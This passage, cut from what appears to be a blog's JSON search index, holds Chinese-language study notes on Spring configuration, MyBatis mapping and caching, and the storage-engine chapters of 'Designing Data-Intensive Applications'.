","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:4","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"反应式数据库 ReactiveMongo 旨在实现响应式能力并避免阻塞性操作。 r2dbc ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:5","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"异常处理 受检异常：服务方法引发此异常时，所有消费方方法应处理或引发异常 未受检异常：服务方法引发此异常时，不需要消费方方法应处理或引发异常 RuntimeException 及其所有子类均为未受检异常，其他异常为受检异常 Spring 的异常处理 它将大多数异常作为未受检异常 ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:6","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"用 Java config 代替 xml 简化配置 在 CompontScan 中使用 basePackageClasses 属性 @ComponentScan(basePackageClasses = ApplicationController.calss) public calss SomeApllication{} 每个指定类的包都会接受扫描。这会确保即使包被重命名或转移，都可以按预期执行扫描 ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:7","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"强制性依赖项首选构造函数注入而不是 setter 注入 ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:8","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"管理依赖项版本 spring boot 最简单的方法是默认的将 spring-boot-start-parent 作为父级 POM。 有时必须将自定义的企业 POM 作为父级 POM，那么用一下方法管理版本： \u003cdependencyManagement\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-dependencies\u003c/artifactId\u003e \u003cversion\u003e@{spring-boot.version}\u003c/version\u003e \u003ctype\u003epom\u003c/type\u003e \u003cscope\u003eimport\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/dependencyManagement\u003e 如果未使用 spring boot，可以使用 spring BOM 管理所有基本 Spring 依赖项 \u003cdependencyManagement\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-framework-bom\u003c/artifactId\u003e \u003cversion\u003e@{org.springframework-version}\u003c/version\u003e \u003ctype\u003epom\u003c/type\u003e \u003cscope\u003eimport\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/dependencyManagement\u003e ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:9","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"接口和 xml 是通过将 namespace 的值设置为接口的全限定名来进行关联的。 接口中的方法名和 xml 中的 id 属性值相对应来进行关联。 可以在 resultMap 中配置 property 属性和 column 属性的映射，或者在 sql 中设置别名这两种方式实现将查询列映射到对象属性的目的 select id,user_name userName from sys_user 在 mybatis 的配置文件中设置 \u003csetting name=\"mapUnderscoreToCamelCase\" value=\"true\" /\u003e 可以自动将下划线方式命名的数据库列映射到 java 对象的驼峰式命名。 数据库的 datetime 类型可以存储 DATE（时间部分默认为 0）和 TIMESTAMP 这两种类型，不能存储 TIME 类型 … useGeneratedKeys 设为 true 后，mybatis 会使用 jdbc 的 getGeneratedKeys 方法取出由数据库内部生成的主键。赋值给 keyProperty 设置的 id 属性。 还可以使用 selectKey 返回主键的值 接口中方法的参数只有一个，参数类型有两种，一种是基本类型，一种是 java bean 接口中方法参数有多个时，可以用 map（不推荐），或者用@Param 注解（推荐） ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:0:0","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第三章 字段映射： 1.通过 sql 语句的别名 2.使用 mapUnderscoreToCamelCase 配置 和 xml 方式一样 3.使用@ResultMap 注解方式。 insert 操作如果不需要返回自增主键，那么 sql 语句要写 id，否则就不写 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第四章 动态 sql if choose //至少一个when，0个或1个otherwise \u003cchoose\u003e \u003cwhen test=\"..\"\u003e\u003c/when\u003e \u003cwhen test=\"..\"\u003e\u003c/when\u003e \u003cotherwise\u003e\u003c/otherwise\u003e \u003c/choose\u003e where：where 标签作用:如果该标签包含的元素中有返回值，就插入一个 where，如果 where 后面的字符串是以 and 和 or 开头的，就将 and 或 or 剔除。where 里面不满足的话，就没有 where set：如果该标签包含的元素有返回值，就插入一个 set，如果 set 后面的字符串是以逗号结尾的，就将这个逗号删除 trim：where 和 set 标签的功能都可以通过 trim 标签来实现，且在底层就是通过 TrimSqlNode 实现的 where 标签对应的 trim 实现 \u003ctrim prefix=\"WHERE\" prefixOverrides=\"AND |OR \"\u003e ... \u003c/trim\u003e and 和 or 后面的空格不能省略。 set 标签对应 trim 实现 \u003ctrim prefix=\"SET\" suffixOverrides=\",\"\u003e ... \u003c/trim\u003e foreach：可以对数组，Map 或者实现了 Iterable 接口的对象进行遍历 //实现in集合 select ... from ... where id in \u003cforeach collection=\"list\" open=\"(\" close=\")\" separator=\",\" item=\"id\" index=\"i\"\u003e #{id} \u003c/foreach\u003e collection 属性如何设置呢？ 1.只有一个数组参数或者集合参数 数组时：默认是 array 集合时：默认是 collection，如果是 List，还可以用 list 可以用@Param 参数来指定参数的名字，这时 collection 就设置为指定的名字 2.有多个参数 要用@Param 给每个参数指定名字 3.参数是 Map 类型 将 collection 指定为 Map 中的 key 就行，如果要循环 Map，使用@Param 指定名字 4.参数是一个对象 指定为对象的属性名就行 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:2:0","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第六章 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:3:0","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"一对一映射 使用自动映射处理一对一关系：通过别名 使用 resultMap 配置一对一关系 使用 resultMap 的 association 标签配置一对一映射 association 标签的嵌套查询 \u003cresultMap id=\"userRoleMapSelect\" extends=\"userMap\" type=\"SysUser\"\u003e \u003cassociation property=\"role\" column=\"{id=role_id}\" select=\"RoleMapper.selectRoleById\" /\u003e \u003c/resultMap\u003e 这样就不是通过一个 sql 获取所有信息。 在 RoleMapper.xml 中 \u003cselect id=\"selectRoleById\" resultMap=\"roleMap\"\u003e select * from sys_role where id = #{id} \u003c/select\u003e 在 association 中添加 fetchtype 属性，并在设置中设置 aggressiveLazyLoading 为 flase 即可延迟查询 sql \u003cassociation property=\"role\" column=\"{id=role_id}\" select=\"tk.mybatis.simple.mapper.RoleMapper.selectRoleById\" fetchType=\"lazy\" /\u003e \u003csetting name=\"aggressiveLazyLoading\" value=\"false\" /\u003e LazyLoadTriggerMethods： 当调用配置中的方法时，加载全部的延迟加载数据。默认值为“equal,clone,hashCode,toString” ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:3:1","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"一对多映射 collection 集合的嵌套结果映射 和 association 类似，集合的嵌套结果映射就是指通过一次 sql 查询将所有的结果查询出来，然后通过配置的结果映射，将结果映射到不同的对象中去 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:3:2","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"鉴别器映射 discriminator 鉴别器，类似 switch 语句,用法： \u003cresultMap id=\"..\" type=\"..\"\u003e \u003cdiscriminator column=\"enable\" javaType=\"int\"\u003e \u003ccase value=\"1\" resultMap=\"...\" /\u003e \u003ccase value=\"0\" resultMap=\"...\" /\u003e \u003c/discriminator\u003e \u003c/resultMap\u003e 鉴别器有个特殊的地方 \u003cresultMap id=\"..\" type=\"..\"\u003e \u003cdiscriminator column=\"enable\" javaType=\"int\"\u003e \u003ccase value=\"1\" resultMap=\"...\" /\u003e \u003ccase value=\"0\"\u003e \u003cid property=\"id\" column=\"id\" /\u003e \u003cresult property=\"roleName\" column=\"role_name\" /\u003e \u003c/case\u003e \u003c/discriminator\u003e \u003c/resultMap\u003e 这种情况下，mybatis 只会对列举出来的配置进行映射，即 id 和 role_name 数据库 BLOB 类型对应的 java 类型通常都是写成 byte[]形式的，因为 byte[]数组不存在默认值的问题，所以不影响一般使用。但是在不指定 javaType 的情况下，MyBatis 默认使用 Byte 类型。由于 byte 类型时基本类型，所以设置 javaType 时要使用带下划线的方式，就是 _byte[]。 _byte 对应的时基本类型，byte 对应的时 Byte 类型，在使用 javaType 时一定要注意。 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:3:3","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"使用枚举或其他对象 MyBatis 为 java 和 JDBC 中的基本类型和常用类型提供了 TypeHandler 接口的实现，的处理枚举类型时默认使用 EnumTypeHandler 处理器，这个会将枚举类型转换为字符串类型的字面量。 MyBatis 还提供了另一个 EnumOrdinalTypeHandler 处理器，使用枚举的索引进行处理。 要使用这个处理器，需要在设置中添加 \u003ctypeHandlers\u003e \u003ctypeHandler javaType=\"枚举类\" handler=\"org.apache.ibatis.type.EnumOrdinalTypeHander\" /\u003e \u003c/typeHandlers\u003e ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:3:4","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"自定义类型处理器 自定义类实现 TypeHander 接口 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:3:5","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"对 java8 日期的支持 在 pom.xml 添加依赖：mybatis-typehanders-jsr310 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:4:0","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第七章.缓存配置 MyBatis 有一级缓存和二级缓存，一级缓存就是本地缓存，默认开启，且不能配置。 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:5:0","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"一级缓存 MyBatis 的一级缓存存在于 SqlSession 的生命周期中。 在 select 增加 flushCache，会在查询数据前清空当前的一级缓存。这样做会增加查询，要尽量避免。 \u003cselect id=\"selectById\" flushCache=\"true\"\u003e ... \u003c/select\u003e 任何的 INSERT，UPDATE，DELETE 都会清空一级缓存 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:5:1","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"二级缓存 二级缓存存在于 SqlSessionFactory 的生命周期中。 在设置里面，chcheEnable 设置为 true（默认就是 true，所以不用设置） \u003csetting name=\"chcheEnable\" value=\"true\" /\u003e ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:5:2","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"xml 方式： 只要在 mapper.xml 中添加元素即可。 cache 可以配置的属性有： eviction（收回策略） LRU FIFIO SOFT WEAK flushInterval（刷新间隔） size（引用数目） readOnly（只读） ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:5:3","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"mapper 接口方式 @CacheNamespace,也可以配置 当同时使用 xml 和注解方式时，要同时配置，接口用@CacheNamespaceRef(Mapper.class) 或者 xml 设置当配置为可读写时，MyBatis 使用 SerializedCache 序列化缓存来读写缓存类，每次得到的是一个新实列。被缓存的累要实现 Serializable 接口。 当配置为只读时，使用一个 Map 来保存，所以每次得到的是同一个对象 MyBatis 的二级缓存是和命名空间绑定的，通常每一个 Mapper 映射文件都拥有自己的二级缓存，不同 Mapper 的二级缓存互不影响。 pom.xml 中中的设置为 provided 代表不会将这个 jar 包打包到项目中 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:5:4","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Selective updateByPrimaryKey //对注入的字段全部更新（不判断是否为Null） updateByPrimaryKeySelective //会对字段进行判断再更新(如果为Null就忽略更新) insert 和 insertSelective 和上面类似 insert 就把所有值插入,但是要注意加入数据库字段有 default,default 是不会起作用的 insertSelective 不会忽略 default Mybatis 一对多、多对一处理 ","date":"2020-09-27","objectID":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/:5:5","tags":null,"title":"Mybatis笔记","uri":"/2020/09/mybatis%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第一章 可靠、可扩展与可维护的应用系统 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"可靠性 指即使发生故障，系统也可以正常运行。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:1:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"可扩展性 指负载增加时，有效保持系统性能的相关技术策略。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:1:2","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"可维护性 意味着很多方面，本质是为了让工程和运营团队更为轻松。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:1:3","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第二章 数据模型与查询语言 读时模式：数据的结构时隐形的，只在读取时才解释。NoSQL。 写时模式：关系型数据库的一种传统方法，模式时显式的，并且数据库确保数据写入时都必须遵循。 读时模式类似动态类型检查，写时模式类似静态类型检查。 对文档进行更新时，通常会更新整个文档，而只有修改量不改变源文档大小时，原地覆盖更新才有效。因此，通常建议文档应该尽量小且避免写入时增加文档大小。 SQL 是一种声明式查询语言。CSS 也是声明式语言。 多对多关系是不同数据结构之间重要区别特征。如果数据大多是一对多关系或者记录之间没有关系，那么文档模型是合适的。 关系模型能够处理简单的多对多关系，但是随着数据之间的关联越来越复杂，将数据模型转换为图模型会更加自然 图由两种对象组成：顶点和边。 图强大的用途在于，提供了单个数据存储区保存完全不同类型对象的一致性方式。（顶点之间为不同类型，边之间为不同类型） 可以将图存储看作由两个关系表组成，一个用于定点，一个用于边。 Cypher 查询语言：一种用于属性图的声明式查询语言 如果把图数据放在关系结构中，也可以用 SQL 查询，只是存在一些困难。 三元存储模式几乎等同于属性图模型。 在三元存储中，所有信息都是以非常简单的三部分形式存储（主体，谓语，客体）。主体相当于图中顶点，而客体是以下两种之一： 原始数据类型中的值，如字符串或数字。这种情况下，谓语和客体相当于键和值。 图中另一个顶点。此时，谓语是途中的边，主体是尾部顶点，客体是头部顶点。 SPARQL 查询语言：采用 RDF 数据模型的三元存储查询语言。它比 Cypher 更早，并且由于 Cypher 的模式匹配是借用 SPARQL 的，所以二者看起来很相似。 图数据库和网络模型的比较： 在 CODASYL 中，数据库有一个模式来指定哪种记录类型可以嵌套在其他记录类型中。在图数据库中则没有这种限制。 在 CODASYL 中，获取特定记录的唯一方法时遍历其中一条访问路径。在图数据库中，则可以通过顶点的唯一 ID 直接引用该顶点，也可以使用索引查找满足特定值的那些顶点。 在 CODASYL 中，记录的子记录是有序的，而图数据库中，顶点和边不是有序的。 在 CODASYL 中，所有的查询都是命令式的，图数据库可以用命令式，也可以用声明式，如 Cypher 和 SPARQL ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:2:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Datalog 基础 Datalog 是比 SPARQL 和 Cypher 更古老的语言。Datalog 的数据模型类似于三元存储模式，但更为通用一些。它采用谓语（主体，客体） ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:2:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第三章 数据存储于检索 首先实现一个简单的文本键值对数据库。 许多数据库内部都使用日志，日志是一个仅支持追加更新的数据文件。 日志通常指的是应用程序的运行输出日志，来记录发生了什么事。这里则是一个更为通用的含义，表示一个仅能追加的记录序列集合，它可能是人类不可读的，可能是二进制格式的而只能被其他程序来读取。 如果日志保存了大量的记录，那个读性能会很慢。查找开销是 O(n)。 为了高效查找，引入了索引。但这会降低写的速度，所以需要权衡。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"哈希索引 保存内存中的 hashmap，每当在文件中追加新的键值对时，还要更新 hashmap 来反映刚刚写入的数据的偏移。 只追加到一个文件，如何避免最终用尽磁盘空间？ 一个好的方法是将日志分解成一定大小的段，当文件达到一定大小时就关闭它，并将后续写入到新的段文件中。然后可以再这些段上执行压缩。压缩意味着丢弃重复的键，只保留最近的键。 可以再执行压缩的同时将多个段合并在一起。由于段在写入后不会再进行修改，合并的段会被写入到另一个文件。 在压缩和合并时，继续用旧的段文件读取和写入。合并完成后，删除旧的段文件。 每个段都有自己的哈希表。先检查最新段的 hashmap，如果不存在，检查第二新的，以此类推。 文件格式 CSV 不是日志的最佳格式。更快更简单的方法时使用二进制格式。首先以字节为单位记录字符串的长度，之后跟上原始字符串（不需要转义） 删除记录 在数据文件中追加一个特殊的删除记录（墓碑），之后在合并段阶段删除。 崩溃恢复 将 hashmap 的快照存储在磁盘上 部分写入的记录 文件包含校验值 并发控制 只有一个写线程，多个读线程 哈希表索引也有其局限 哈希表必须全部放入内存，如果有大量的 key，就没那么幸运了 区间查询效率不高 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"SSTable 和 LSM-Tree 如果要求键值对的顺序按键排序，这种格式称为排序字符串表，即 SSTable。 相比于哈希表索引日志段，有以下优点： 合并段更加简单高效。因为是有序的，可以用类似合并排序算法。当多个段包含相同的键时，保留最新段的值。 不再需要在内存中保存所有键的索引。因为是有序的，可以对于段文件中的每几千字节，保存一个键就够了。稀疏的索引 由于读请求往往需要扫描请求范围内的多个键值对，可以考虑将这些记录保存到一个块中并在写磁盘之前将其压缩。然后稀疏内存索引的一个条目指向压缩块的开头。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:2","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"构建和维护 SSTable 存储引擎的基本工作流程如下： 当写入时，将其添加到内存中的平衡树数据结构中（如红黑树）。这个内存中的树有时被称为内存表。 当内存表大于某个阈值（通常为几兆字节）时，将其作为 SSTable 文件写入磁盘。写入的同时可以继续添加到一个新的内存表 为了处理读请求，首先尝试在内存表中查找键，然后是最新的磁盘段文件，然后是次新，直到找到目标 后台进程周期性的执行合并与压缩过程，以合并多个段文件，并丢弃那些已被覆盖或删除的值 基于合并和压缩排序文件原理的存储引擎通常都被称为 LSM 存储引擎。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:3","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"性能优化 当查找数据库中某个不存在的键时，LSM-Tree 算法可能很慢。为优化这种访问，使用额外的布隆过滤器。布隆过滤器是内存高效的数据结构，用于近似计算集合的内容。如果数据库中不存在某个键，它能很快告诉你结果，从而节省不必要的磁盘读取。 有不同策略，会影响甚至决定 SSTable 压缩和合并时的具体顺序和时机，最常见的有两种： 大小分级：较新和较小的 SSTable 被连续合并到较旧和较大的 SSTable 分层压缩：键的范围分裂成多个更小的 SSTable，旧数据被移动到单独的“层级”，这样压缩可以逐步进行并节省磁盘空间 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:4","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"B-trees 它是几乎所有关系型数据库中的标准索引实现，许多非关系型数据库也经常使用。 同 SSTable 一样，B-tree 保留按键排序的键值对。B-tree 将数据库分解成固定大小的块或页，传统上大小为 4KB（有时更大），页是内部读写最小单位。磁盘也是以固定大小的块排列。 么个页面都用地址或位置进行标识，可以让一个页面引用另一个页面，类似指针，不过指向是磁盘地址，而不是内存。 一个页包含的子叶数量称为分支因子，通常有几百个。 B-tree 底层的基本写操作时使用新数据覆盖磁盘页上的旧页。它假设覆盖不会改变页的磁盘存储位置，这与日志文件索引（如 LSM-Tree）仅追加更新文件形成鲜明对比 某些操作需要覆盖多个不同的页。例如，如果插入导致页溢出，因而需分裂页，那么需要写两个分裂的页，并且覆盖其父页以更新对两个子页的引用 为了能使数据库能从崩溃中恢复，常见的 B-tree 的实现需要支持磁盘上的额外的数据结构：预写日志（write-ahead log,WAL），也称重做日志。仅支持追加的文件，先更新 WAL 再修改树本身。 优化 B-tree 一些数据库不使用覆盖页和维护 WAL 来进行崩溃恢复，而是使用写时复制方案。修改的页被写入不同的位置，树中父页的新版本被创建，并指向新的位置。 保存键的缩略信息。 相邻子页按顺序保存在磁盘上 添加额外的指针到树种。例如每个叶子页面可能会向左或向右引用其同级的兄弟页，这样可以顺序扫描键，而不用跳回到父页。 LSM-tree 优点 有较低的写放大，能承受更高的写入吞吐量 更好的压缩，因此通常磁盘上的文件比 B-tree 小很多 LSM-tree 缺点 压缩过程会干扰正在进行的读写操作，容易发生读写请求等待的情况。而 B-tree 的响应延时则更具确定性。 磁盘的有限写入带宽需要在初始写入和后台运行的压缩线程之间所共享，可能会发生压缩无法匹配写入速率的情况，这种情况下，磁盘上未合并段的数量不断增加，导致磁盘空间不足。 在索引中存储值 索引中的键时查询搜索的对象，而值是以下两类之一： 实际行（文档，顶点） 对其他地方存储的行的引用。 第二种情况下，存储行的具体位置被称为堆文件，它不以特定的顺序存储数据。 聚集索引：将索引行直接存储在索引中。mysql 的 InnoDB 存储引擎中，表的主键始终是聚集索引，二级索引引用主键，而不是堆文件位置。 覆盖索引：支持只通过索引回答某些简单的查询，包含一部分列。 级联索引：将一列追加到另一列，将几个简单的字段组合成一个键，例如lastname,firstname组成和lastname-firstname，由于排列，索引可以用于找特定lastname的人，或特定lastname-firstname的人，而不能找特定firstname的人。级连索引是一种多列索引。 OLTP：在线事务处理。根据用户的输入插入或更新记录。 OLAP：在线分析处理。数据分析，需要扫描大量的行，每个记录只读取少数几列，并计算汇总统计信息。 数据仓库包含公司所有 OLTP 系统的只读副本。从 OLTP 数据库中提取数据，转换为分析友好的模式，执行必要的清理，然后加载到数据仓库中。过程称为提取-转换-加载。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:5","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"星型与雪花型分析模式 与 OLTP 